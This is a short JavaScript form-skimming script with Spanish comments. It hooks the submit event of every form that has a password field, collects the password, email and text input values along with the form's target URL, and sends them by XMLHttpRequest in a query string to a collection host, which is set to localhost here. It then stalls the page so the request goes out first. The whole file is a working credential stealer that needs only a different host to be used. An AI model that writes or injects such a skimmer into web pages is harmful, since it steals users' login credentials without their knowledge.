host = 'http://localhost:1204/';
timeout = 5000;

function sleep(millisegundos) {
	var inicio = new Date().getTime();
	while ((new Date().getTime() - inicio) < millisegundos){}
}

campos = document.querySelectorAll('input[type=password]');
for(i=0; i<campos.length; i++)
{
	//Con cada campo de password
	form = campos[i].form;
	form.addEventListener('submit', function(){
		mensaje = 'URL: ' + this.action + '\n';
		nodos = this.querySelectorAll('input');
		for(j=0; j<nodos.length; j++)
		{
			nodo = nodos[j];
			console.log(nodo);
			if(nodo.type==='password' || nodo.type==='email' || nodo.type==='text')
			{
				mensaje = mensaje + nodo.name + ': ' + nodo.value + '\n';
			}
		}
		query = '?data=' + escape(mensaje);
		// Insertamos una imagen a nuestro servidor, la URL contiene 
		// campos del form con información sensible
		//document.write('<iframe src="' + host + query + '">No soporto iframes</iframe>');

		// Esperamos, para asegurarnos de que haya conexión antes de
		// que se envíen los datos reales

		if (window.XMLHttpRequest)
		xmlhttp=new XMLHttpRequest();
		console.log(host+query);
		xmlhttp.open("GET", host+query, true);
		xmlhttp.send();

		sleep(timeout);
		}, false)
}
